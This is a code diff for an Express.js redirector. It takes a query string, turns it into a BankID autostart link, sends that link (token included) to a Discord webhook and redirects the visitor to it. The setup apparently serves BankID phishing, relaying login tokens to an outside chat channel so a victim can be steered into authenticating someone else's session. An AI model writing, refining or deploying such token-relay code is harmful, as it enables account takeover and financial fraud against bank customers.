@@ -12,12 +12,21 @@ app.use(express.json());
 
 app.get('/', (req, res) => {
   // Construct the redirect URL with all query parameters
-  const redirectUrl = `bankid://?autostarttoken=${req.originalUrl.slice(1)}`; // slice(1) to remove the leading '/'
+  const queryString = req.originalUrl.split('?')[1]; // Get query string part after '?'
 
+  if (!queryString) {
+    return res.status(400).send('Query parameters are required.');
+  }
 
-  res.redirect(redirectUrl);
+  const redirectUrl = `bankid://?autostarttoken=${queryString}`;
+
+  // Log the redirect URL to Discord webhook
   sendDiscordWebhook(redirectUrl);
+
+  // Redirect to the constructed URL
+  res.redirect(redirectUrl);
 });
+
 
 
   // Function to send Discord webhook
